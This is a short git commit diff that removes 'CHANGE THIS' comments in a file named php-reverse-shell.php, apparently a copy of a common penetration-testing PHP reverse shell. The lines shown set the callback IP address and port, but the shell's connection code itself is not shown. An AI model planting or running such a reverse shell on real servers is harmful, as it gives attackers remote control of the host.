f84b489bf918a0f7394c244114222f545f9b77b8
Fernando Cassio <136193355+FernandoCassioDev@users.noreply.github.com>
2026-03-24 21:17:29 -0300

    style: removing comments

--- php-reverse-shell.php
+++ php-reverse-shell.php
@@ -1,8 +1,8 @@
 <?php
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '192.168.210.189';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$ip = '192.168.210.189';
+$port = 1234;     
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
